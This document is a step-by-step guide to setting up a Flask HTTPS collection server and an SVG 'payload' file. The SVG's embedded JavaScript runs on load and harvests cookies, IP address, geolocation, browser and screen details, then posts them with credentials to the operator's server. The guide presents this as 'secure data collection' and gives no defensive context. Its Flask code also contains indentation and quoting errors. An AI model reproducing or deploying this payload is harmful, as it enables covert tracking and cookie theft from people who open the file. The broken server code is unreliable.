# Flask Server with SVG Payloads

## Step 1: Generate SSL Certificates

**OpenSSL Self-Signed Certificates**

```
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
```

OR

**Using a Trusted Certificate Authority (Let's Encrypt)**

Prerequisites

* You need a domain name for your server.
* Your server should be accessible over the internet.

**Install Certbot**

Certbot is a tool that automates the process of obtaining and renewing SSL certificates from Let's Encrypt.

* Install Certbot on Ubuntu:

```
sudo apt update
sudo apt install certbot
sudo apt install python3-certbot-nginx
```

* Install Certbot on CentOS/RHEL:

```
sudo yum install epel-release
sudo yum install certbot
sudo yum install python3-certbot-nginx
```

* Install Certbot on macOS:

```
brew install certbot
```

**Obtain an SSL Certificate**

Use Certbot to obtain an SSL certificate for your domain. This example uses the standalone mode, which requires stopping your web server temporarily.

1. Stop your web server (if running):

```
sudo systemctl stop nginx
```

2. Run Certbot to obtain the certificate: Replace your-domain.com with your actual domain name.

```
sudo certbot certonly --standalone -d your-domain.com
```

3. Restart your web server:

```
sudo systemctl start nginx
```

The certificates are usually saved in the /etc/letsencrypt/live/your-domain.com/ directory.

## Step 2: Configure Flask to Use the Certificate

Update your Flask application to use the SSL certificate

1. Modify your Flask application (app.py) to use the certificate files obtained from Let's Encrypt.

```
nano server.py

from flask import Flask, request, jsonify, make_response
from flask_cors import CORS

app = Flask(__name__)
CORS(app, supports_credentials=True)  # This will enable CORS for all routes with credentials

@app.route('/', methods=['POST'])
def receive_data():
	try:
		data = request.get_json()
		print(f'Received data: {data}')
		# You can save the data to a file or database here
		# Set a secure cookie
		response = make_response(jsonify({'status': 'success', 'data': data}))
		response.set_cookie('secureTestCookie', 'secureValue', secure=True, httponly=True, samesite='Strict')
        return response, 200
		except Exception as e:
		print(f'Error: {str(e)}')
		return jsonify({'status': 'error', 'message': str(e)}), 500
		
if __name__ == '__main__':
	app.run(host='0.0.0.0', port=8080, ssl_context=('/etc/letsencrypt/live/your-domain.com/fullchain.pem', /etc/letsencrypt/live/your-domain.com/privkey.pem'))
```

2. Make the server script executable

```
sudo chmod +x server.py
```

3. Run the server script\


```
python3 server.py
```

## Step 3: Create and Serve the SVG File Over HTTPS

Ensure your server is properly set up to serve the SVG file over HTTPS.

1. Create the SVG File (data-collector.svg):

```
<?xml version="1.0" encoding="UTF-8" standalone="no"?>

<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">`
	<foreignObject x="0" y="0" width="800" height="600">
		<body xmlns="http://www.w3.org/1999/xhtml">
			<h1>Secure Data Collection</h1>
			<script type="text/javascript">
				<![CDATA[
				function getCookies() {
					var cookies = document.cookie.split(';').reduce((acc, cookie) => {
						var [name, value] = cookie.split('=');
						if (name && value) {
							acc[name.trim()] = value.trim();
						}
						return acc;
					}, {});
					console.log('Collected cookies: ', cookies); // Debugging information
					return cookies;
				}
				
				function getClientIP() {
					var xhr = new XMLHttpRequest();
					xhr.open('GET', '[https://api.ipify.org?format=json](https://api.ipify.org?format=json)', true);
					xhr.onreadystatechange = function() {
						if (xhr.readyState == 4 && xhr.status == 200) {
							var response = JSON.parse(xhr.responseText);
							var ip = response.ip;
							console.log('Collected IP address: ', ip); // Debugging information
							sendDataToServer(ip);
						}
					}
					xhr.send();
				}
				
				function getUserAgent() {
					return navigator.userAgent;
				}
				
				function getReferrer() {
					return document.referrer;
				}
				
				function getScreenInfo() {
					return {
						width: screen.width,
						height: screen.height,
						availWidth: screen.availWidth,
						availHeight: screen.availHeight
					};
				}
				
				function getNavigatorInfo() {
					return {
						appName: navigator.appName,
						appVersion: navigator.appVersion,
						platform: navigator.platform,
						language: navigator.language
					};
				}
				
				function getGeolocation(callback) {
					if (navigator.geolocation) {
						navigator.geolocation.getCurrentPosition(
							position => callback({
								latitude: position.coords.latitude,
								longitude: position.coords.longitude
							}),
							error => {
								console.log('Geolocation access denied or unavailable. Using simulated data.');
								callback({
									latitude: '37.7749',  // Example latitude
									longitude: '-122.4194' // Example longitude
								});
							}
						);
					} else {
						console.log('Geolocation not available. Using simulated data.');
						callback({
							latitude: '37.7749',  // Example latitude
							longitude: '-122.4194' // Example longitude
						});
					}
				}
				
				function sendDataToServer(ip) {
					var serverUrl = '[https://your-domain.com:8080](https://your-domain.com:8080)'; // Replace with your server IP and port
					var xhr = new XMLHttpRequest();
					xhr.open('POST', serverUrl, true);
					xhr.setRequestHeader('Content-Type', 'application/json');
					xhr.withCredentials = true;  // Ensure cookies are sent with the request
					xhr.onreadystatechange = function() {
						if (xhr.readyState == 4) {
							if (xhr.status == 200) {
								console.log('Data sent to the server successfully.');
							} else {
								console.error('Error sending data to the server: ' + xhr.responseText);
							}
						}
					}
					
					getGeolocation(geoLocation => {
						var data = JSON.stringify({
							ip: ip,
							cookies: getCookies(),
							userAgent: getUserAgent(),
							referrer: getReferrer(),
							screenInfo: getScreenInfo(),
							navigatorInfo: getNavigatorInfo(),
							geolocation: geoLocation
						});
						console.log('Sending data: ', data); // Debugging information
						xhr.send(data);
					});
				}
				
				window.onload = function() {
					getClientIP();
				}
				]]>
			</script>
		</body>
	</foreignObject>
</svg>
```

2. Serve the SVG File Over HTTPS: Ensure the SVG file is served from your domain over HTTPS. You can place the SVG file in a directory served by your web server (e.g., Nginx or Apache) and ensure it is accessible over HTTPS.
3. Open the SVG File in Your Browser: Open your web browser and navigate to the location of the SVG file served over HTTPS, for example:

```
https[:]//your-domain.com/path/to/data-collector.svg
```

By following these steps, you will have obtained an SSL certificate, configured your Flask application to use the certificate, and ensured your client-side data collection script (in the SVG file) is securely transmitting data to your server over HTTPS.
